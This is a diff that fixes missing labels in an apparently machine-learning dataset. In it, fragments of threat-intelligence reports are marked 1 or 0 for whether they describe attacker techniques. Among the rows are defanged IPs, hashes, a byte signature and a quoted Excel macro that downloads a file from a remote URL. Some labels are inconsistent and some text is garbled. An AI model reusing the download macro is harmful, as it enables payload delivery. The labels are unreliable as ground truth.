@@ -3424,7 +3424,7 @@ use hidden directory (.calisto) to store victim data prior to exfiltration	1
 deliver via malicious documents with embedded macros	1
 Defense Evasion	0
 We assess that these organizations are likely the targets of long-term cyberespionage	0
-Far EasTone Telecommunications Taoyuan City	
+Far EasTone Telecommunications Taoyuan City  0
 establish SSL certificates on typo-squatted domains	1
 Each key will start regsvr32.exe at the system’s startup to execute the DLLs	0
 "malware family."""	0
@@ -4616,7 +4616,7 @@ N/A	0
 gather system information using systeminfo	1
 create SSH tunnels with Plink utility for C2	1
 Encryption	0
-162.158.227.0/24	
+162.158.227.0/24	0
 use attrib.exe to hide gathered local host information	1
 decrypt in-memory using LEA-128 key and decode using XOR key	1
 include base64-encoded executable	1
@@ -4870,7 +4870,7 @@ Domains	0
 list all servers in a domain and locate domain controllers	1
 stop multiple Windows services before beginning encryption	1
 detect security software via scripts	1
-"(drop ""RATANKBA"" entry skipped)"	
+"(drop ""RATANKBA"" entry skipped)"  1
 The campaign targets high-profile organizations in the Middle East with a focus on	0
 download and execute remote files	1
 decrypt payloads using AES-256-CBC with a unique key per sample	1
@@ -5247,7 +5247,7 @@ list all running processes on the machine	1
 use at to schedule tasks to run at a specific date or time	1
 download and execute additional payloads	1
 XORed to produce the plain text strings.	0
-encryption, and sandbox evasion. It exploits the API for the United States US)-based,	
+encryption, and sandbox evasion. It exploits the API for the United States US)-based,  0
 Figure 11 – PDF lure written in Azerbaijani.	0
 00-00-00-00-00-00: meant to be MAC address of the destination but always defaults to 00-00-00-00-00-00.	0
 request service tickets and return crackable ticket hashes using Invoke-Kerberoast	1
@@ -5342,7 +5342,7 @@ Figure 24. Blocked execution of the MultiLayer wiper by Cortex XDR platform.	0
 Used to abuse	0
 use SMTP and POP3 for C2	1
 distribute malicious payloads embedded in PNG files	1
-162.158.191.0/24	
+162.158.191.0/24	0
 download malicious DLLs to serve as a loader for additional malware	1
 reconfigure DNS records to point to actor-controlled domains and websites	1
 Figure 1. Infrastructure overview.	0
@@ -7706,7 +7706,7 @@ download additional payloads to compromised hosts	1
 inject into a newly spawned process created from a native Windows executable	1
 execute payloads through kubelet API run command and by executing commands in running containers	1
 gather domain controller hashes from NTDS to collect hashed passwords	1
-223.189.252.0/24	
+223.189.252.0/24  0
 Recorded Future® | www.recordedfuture.com | Distribution: Public, from Insikt Group	0
 distinct infection chains, which we will detail below.	0
 enable arbitrary command execution on compromised Ivanti Connect Secure VPNs via a web shell	1
@@ -9328,7 +9328,7 @@ command to start TelePowerBot will be added to autorun. This means that TelePowe
 facto embassies. The group targets internet-facing appliances such as firewalls, load balancers, and	0
 Pink is to collect as much information as possible about the victim’s network	0
 enumerate local drives	1
-122.161.240.0/24	
+122.161.240.0/24  0
 rc4 decrypt and base64-decode C2 commands	1
 naval operations in the region. We encourage all organizations to leverage our findings to	0
 add devices as allowed IDs for ActiveSync using Set-CASMailbox to obtain mailbox copies and add Mail.Read/Mail.ReadWrite permissions to application/service principals	1
@@ -9494,7 +9494,7 @@ set files and directories to hidden to evade discovery	1
 modify cloud storage lifecycle policies to destroy stored objects	1
 obtain Windows logon password details	1
 collect data from compromised host including Windows authentication information	1
-create unique victim ideifier using volume ID or computer name	
+create unique victim ideifier using volume ID or computer name  1
 host malware on compromised servers	1
 exploit remote service vulnerabilities (e.g., RDP) to gain access	1
 decrypt payload using RC4, AES, or single-byte XOR	1
@@ -10349,7 +10349,7 @@ encrypt data using ChaCha8 and ECDH	1
 use run-only/stripped AppleScripts to remove human-readable indicators	1
 use gsecdump to dump account hashes	1
 store captured system information locally prior to exfiltration	1
-We assess that there are parallels between the EternalBlue exploit and the	
+We assess that there are parallels between the EternalBlue exploit and the  0
 capture screenshots and exfiltrate them to C2	1
 code execution RCE vulnerabilities in popular VPN, mail server, firewall, and load-balancing	0
 decode, decrypt, and decompress data received in C2 HTTP POST requests	1
@@ -10625,7 +10625,7 @@ compromise domains to host command and control infrastructure	1
 create scheduled tasks to run hourly for persistence	1
 use spearphishing emails with stolen legitimate attachments containing embedded malicious macros	1
 use batch scripts to self-delete after execution	1
-New	
+New  0
 The nal payload, Cobalt Stike, might use additional techniques listed on the	0
 """104.238.149.146"", datetime(""2023-07-13""), datetime(""2023-07-14""),"	0
 send spearphishing emails containing malicious Microsoft Word documents	1
@@ -11060,7 +11060,7 @@ components	0
 exploit CVE-2020-0688 in Microsoft Exchange	1
 subsequent lateral movement to internal networks.	0
 attach BPF or packet filters to sockets to trigger code on magic bytes	1
-determine if host is running 32-bit or 64-bit OS architecture 1	
+determine if host is running 32-bit or 64-bit OS architecture  1
 Figure 3 – Example of the decryption of the string “php-”.	0
 use HTTP over ports 447 and 8082 for C2 and use a custom unencrypted protocol over port 443	1
 deliver a Windows proxy and use multiple reverse proxy chains as part of C2 infrastructure	1
@@ -12561,7 +12561,7 @@ deploy scripts to automatically scan for documents of interest	1
 timestamps are also accurate. The timeline we’ve reconstructed is as follows:	0
 collect system name and OS version	1
 the recipient of a few rounds of fundings since 2017. One of its investors	0
-122.162.147.0/24	
+122.162.147.0/24	0
 encrypt network traffic with AES using hardcoded or negotiated key	1
 Post-compromise activity	0
 “Command” – Executes a process with a specified argument. In this case, the data is	0
@@ -12968,7 +12968,7 @@ gatherm info via WMI (system directory, build number, serial, version, manufactu
 Dark Pink APT unleashes malware for deeper and more	0
 transfer files to and from compromised hosts	1
 For the last few years, Scarred Manticore has been observed carrying out multiple	0
-From the same	
+From the same  0
 use Twitter account to communicate with victims	1
 c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d	0
 use HTTP to send victim host information to command and control	1
@@ -13071,7 +13071,7 @@ Additional Tools	0
 use compromised email accounts to send credential phishing emails	1
 install DLLs as services with generated names	1
 Get system info	0
-122.161.243.0/24	
+122.161.243.0/24	0
 collect the timestamp from the victim's machine	1
 ECDSA:	0
 JavaScript	0
@@ -13946,7 +13946,7 @@ use remote template URLs injected into documents to enable forced authentication
 use VPN tunnels in legitimate software company infrastructure to gain access to internal networks	1
 open-source project called CRYLINE-v5.0, hosted on GitHub. We assess that BFG’s	0
 the re department of a country’s military branch.	0
-122.161.241.0/24	
+122.161.241.0/24	0
 list files and file characteristics including extension, size, owner, and permissions	1
 Domain	0
 use modified wmiexec.vbs and secretsdump.py to dump credentials	1
@@ -14232,7 +14232,7 @@ Execution of the Integrity Checker Tool	0
 Recently, Muddy Water campaigns also led to the deployment of a new, previously undocumented tailor-made	0
 (gwmi cim_logicaldisk|?{($_.drivetype -eq 2)-and(Test-path	0
 search for files and directories	1
-ResourcesSupportAbout TrendSelect a country / region PrivacyLegalAccessibilitySite mapCopyright ©2024 Trend Micro Incorporated. All rightsreserve	
+ResourcesSupportAbout TrendSelect a country / region PrivacyLegalAccessibilitySite mapCopyright ©2024 Trend Micro Incorporated. All rightsreserve  0
 pipe, which is read by the loader	0
 In the cases we observed, we found the decoy les to be either Microsoft	0
 delete files including dropper component	1
@@ -14304,7 +14304,7 @@ use InstallUtil.exe to disable Windows Defender	1
 Beautify” recipe.	0
 execute malware with C:\windows\system32\rundll32.exe	1
 =CALL(« urlmon », »URLDownloadToFileA« , »JJCCBB »,0, »https[:]//cs.com.sg/Backup/Bk778kXNKMiH5vH/« , »..\oxnv1.ooccxx »,0,0)	0
-104.238.149[.]146	
+104.238.149[.]146  0
 if($mid -isnot [int]){	0
 use compromised victims as proxies to relay command traffic and use proxy tools to allow C2 behind routers	1
 capture screenshots on Windows and macOS systems	1
@@ -15771,7 +15771,7 @@ in the file name and contains the MS Word icon as a means of confusing the victi
 delete backup catalog using wbadmin and delete volume shadow copies using vssadmin.exe	1
 monitor browser for online banking sessions and display overlay to manipulate sessions	1
 enable RestrictedAdmin or similar registry edits to allow pass-the-hash RDP connections	1
-223.188.237.0/24	
+223.188.237.0/24	0
 detect debugger and run infinite loop to thwart analysis	1
 more on operational security during the past few years, with the group’s	0
 extract Word documents from file server	1
@@ -16134,7 +16134,7 @@ encrypt files with AES key encrypted with RSA-1028	1
 been disabled. Further review of historic network traffic from the device also revealed suspect	0
 monitor the clipboard for cryptocurrency addresses and replace with attacker-controlled address	1
 8b 50 04 c1 e2 05 09 d1 4? 8b 44 ?4 08 33 08 4? 8b 44 ?4 08 89 48 04 4? 8b 44 ?4 08 8b 48 0c 4? 8b 44 ?4 08 03 48 08	0
-algorithm (subtracting each byte by 3), which is probably by mistake. In a newer sample, the malware	
+algorithm (subtracting each byte by 3), which is probably by mistake. In a newer sample, the malware	0
 set file attributes to hidden for dynamic debugging	1
 T1608.004 Stage Capabilities: Drive-by Target	0
 extract files from compromised networks	1
@@ -17887,7 +17887,7 @@ harvest cookies from various browsers	1
 Code Signing Certificates	0
 mark binary for deletion after reboot	1
 compromise websites to fingerprint and target victims	1
-idenfy OS version, CPU, and otr system details	
+idenfy OS version, CPU, and otr system details	1
 Close or change credentials for all compromised accounts. Depending on the level	0
 on port 8080 that occurred in March 2023, proxying credential theft for	0
 target browsing history of network administrators	1
@@ -18233,6 +18233,7 @@ becbd20a19bab555b92d471b30b8159dfa709e9bc417e5d42d72c94546d9e61c Schema.inf	0
 configure S3 bucket notifications to trigger malicious Lambda functions on uploads or account changes	1
 terminate the winlogon.exe process to prevent attempts to log on	1
 conduct Kerberoasting attacks using publicly available modules	1
-162.158.235.0/24	
+162.158.235.0/24	0
 administrative privileges. To do so, the attackers tried multiple methods to obtain	0
 use custom deobfuscation technique	1
+
